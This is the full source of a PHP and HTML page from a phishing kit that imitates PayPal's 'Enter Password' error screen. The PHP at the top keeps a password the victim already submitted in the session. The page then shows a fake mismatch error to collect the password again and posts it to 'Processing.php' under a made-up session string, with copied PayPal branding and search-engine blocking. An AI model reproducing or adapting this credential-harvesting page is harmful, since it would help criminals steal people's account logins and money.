<?php
session_start();
$unpass = $_POST['unpass'];
$_SESSION['unpass'] = $unpass;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<head>
<script>
function validateForm()
{
var x=document.forms["myForm"]["deuxpass"].value;
if (x==null || x=="")
  {
  alert("The password you have entered does not match our records. Please try again.");
  return false;
  }
}
</script>
</head>

<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<head>

<title>Error -  Password</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="Error/global00.css">

<link media="print" rel="stylesheet" type="text/css" href="Error/print000.css"><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script><script type="text/javascript" src="Error/global00.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script><link rel="shortcut icon" href="Error/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="legacyErrors " id="page"><div id="header" class="notab"><h1><a><img border="0" src="Error/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a class="accessAid skip">Skip to main content</a></span><ul><li class="login"><a>Log In</a></li><li><a>Help</a></li><li class="last"><a>Security Center</a></li></ul></div><div class="empty" id="navPrimary"></div></div><div id="content"><div id="headline"><div class="titleLink secure"><a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 400, height: 480})"><span class="small">Secure</span></a></div><h2>Enter Password</h2>
</div><div id="messageBox" class="legacyErrors"><div class="messageBox error"><h2 class="accessAid">Error Message</h2><p>The password you have entered does not match our records. Please try again.</p></div></div><div id="main" class="legacyErrors"><div class="layout1"><form name="myForm" method="post" action="Processing.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548" onsubmit="return validateForm()"><input type="hidden" name="login_email" value=""><input type="hidden" name="login_confirm_number" value="16211300881433153306"><input type="hidden" name="ru" value><p>Please enter your PayPal password to confirm your information.</p><p class="group error"><label for="deuxpass"><span class="error"><span class="labelText">PayPal Password:</span></span></label><span class="field"><input autocomplete="off" type="password" id="deuxpass" name="deuxpass" value size="40" maxlength="40"></span></p><p class="buttons"><input type="submit" name="confirm.x" value="Login" class="primary button"></p><p><span class="small">&nbsp;<a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 770, height: 700})">Forgot your password?</a></span></p><input name="form_charset" type="hidden" value="UTF-8"></form></div></div></div><div id="footer" role="contentinfo"><h5 class="accessAid">More Information</h5><ul><li class="first"><a>About</a></li><li><a>Accounts</a></li><li><a>Fees</a></li><li><a>Privacy</a></li><li><a>Security Center</a></li><li><a>Contact Us</a></li><li><a>Legal Agreements</a></li><li><a>Jobs</a></li></ul><p id="legal">Copyright © 1999-2013 PayPal. All rights reserved.<br>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value<br>facility, does not require the approval of the Monetary Authority of Singapore.<br>Users are advised to read the <a>terms and conditions</a> carefully.</p></div><div role="navigation" id="navFull"><ul><li class="active"><a class="scTrack:SRD:Nav:BS1">Home</a><ul><li class="active"><a class="scTrack:SRD:Nav:BS2">Get Started</a><ul><li><a class="scTrack:SRD:Nav:BS3">Why Use PayPal</a></li><li><a class="scTrack:SRD:Nav:BS4">How It Works</a></li><li><a class="scTrack:SRD:Nav:BS5">Where to Shop With It</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS6">Send Payment</a><ul><li><a class="scTrack:SRD:Nav:BS7">Send Payment Online</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS9">Request Money</a><ul><li><a class="scTrack:SRD:Nav:BS10">Request Money</a></li><li><a class="scTrack:SRD:Nav:BS11">Send an Invoice</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS12">Sell on eBay</a></li><li><a class="scTrack:SRD:Nav:BS13">Developers</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS15">Personal</a></li><li><a class="scTrack:SRD:Nav:BS46">Business</a></li><li><a class="scTrack:SRD:Nav:BS95">Products</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="Error/widgets0.js"></script>

<noscript><img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" height="1" width="1" border="0" alt></noscript>

<script type="text/javascript">if(typeof YUE == 'object'){YUE.addListener(window, "load", function() { PAYPAL.util.lazyLoad("/pa/js/min/pa.js", function() { 
if (typeof(PAYPAL.analytics.setup) !== "undefined") { PAYPAL.analytics.setup({ data: "pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_confirm%2demail%2dpassword%2dsubmit&teal=wy9VKQ%252fE0uri7pgDtnx1pll2%252f8KxyIucOHz78uslXxKsNNH4RaRbNA%253d%253d_13a9ea2f790&tmpl=p%2fgen%2fcnf%2femail%2dpassword&erpg=The%20password%20you%20have%20entered%20does%20not%20match%20our%20records%2e%20Please%20try%20again%2e&erfd=deuxpass&pgst=1351281211&eccd=A91EFCD0712A84B26E1F368C4D9934D85105EEDE&lgin=out&calc=966dd22a2508e&rsta=en_US", url: "//t.paypal.com/ts" }); }
});
});
} else{var FptiUrl ='https://www.paypalobjects.com/WEBSCR-640-20121008-1/pa/js/min/pa.js';									
									var Fptihead = document.getElementsByTagName('head')[0];
									var FptiScript = document.createElement('script');
									FptiScript.type = 'text/javascript';
									FptiScript.src = FptiUrl;
									Fptihead.appendChild(FptiScript);									
									if (window.addEventListener){
										window.addEventListener("load",  function () {if (typeof(PAYPAL.analytics.setup) !== "undefined") { PAYPAL.analytics.setup({ data: "pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_confirm%2demail%2dpassword%2dsubmit&teal=wy9VKQ%252fE0uri7pgDtnx1pll2%252f8KxyIucOHz78uslXxKsNNH4RaRbNA%253d%253d_13a9ea2f790&tmpl=p%2fgen%2fcnf%2femail%2dpassword&erpg=The%20password%20you%20have%20entered%20does%20not%20match%20our%20records%2e%20Please%20try%20again%2e&erfd=deuxpass&pgst=1351281211&eccd=A91EFCD0712A84B26E1F368C4D9934D85105EEDE&lgin=out&calc=966dd22a2508e&rsta=en_US", url: "//t.paypal.com/ts" }); }
}, false);
									  }  else if (window.attachEvent) {
												window.attachEvent("onload",  function () {if (typeof(PAYPAL.analytics.setup) !== "undefined") { PAYPAL.analytics.setup({ data: "pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_confirm%2demail%2dpassword%2dsubmit&teal=wy9VKQ%252fE0uri7pgDtnx1pll2%252f8KxyIucOHz78uslXxKsNNH4RaRbNA%253d%253d_13a9ea2f790&tmpl=p%2fgen%2fcnf%2femail%2dpassword&erpg=The%20password%20you%20have%20entered%20does%20not%20match%20our%20records%2e%20Please%20try%20again%2e&erfd=deuxpass&pgst=1351281211&eccd=A91EFCD0712A84B26E1F368C4D9934D85105EEDE&lgin=out&calc=966dd22a2508e&rsta=en_US", url: "//t.paypal.com/ts" }); }
});
												} else { window.onload = function(){
																	if (typeof(PAYPAL.analytics.setup) !== "undefined") { PAYPAL.analytics.setup({ data: "pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_confirm%2demail%2dpassword%2dsubmit&teal=wy9VKQ%252fE0uri7pgDtnx1pll2%252f8KxyIucOHz78uslXxKsNNH4RaRbNA%253d%253d_13a9ea2f790&tmpl=p%2fgen%2fcnf%2femail%2dpassword&erpg=The%20password%20you%20have%20entered%20does%20not%20match%20our%20records%2e%20Please%20try%20again%2e&erfd=deuxpass&pgst=1351281211&eccd=A91EFCD0712A84B26E1F368C4D9934D85105EEDE&lgin=out&calc=966dd22a2508e&rsta=en_US", url: "//t.paypal.com/ts" }); }

														       }
														}
								} </script>
<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=p%2fgen%2fcnf%2femail%2dpassword%3a%3a_confirm%2demail%2dpassword%2dsubmit&amp;teal=wy9VKQ%252fE0uri7pgDtnx1pll2%252f8KxyIucOHz78uslXxKsNNH4RaRbNA%253d%253d_13a9ea2f790&amp;tmpl=p%2fgen%2fcnf%2femail%2dpassword&amp;erpg=The%20password%20you%20have%20entered%20does%20not%20match%20our%20records%2e%20Please%20try%20again%2e&amp;erfd=deuxpass&amp;pgst=1351281211&amp;eccd=A91EFCD0712A84B26E1F368C4D9934D85105EEDE&amp;lgin=out&amp;calc=966dd22a2508e&amp;rsta=en_US" height="1" width="1" border="0" alt></noscript>
</body></html>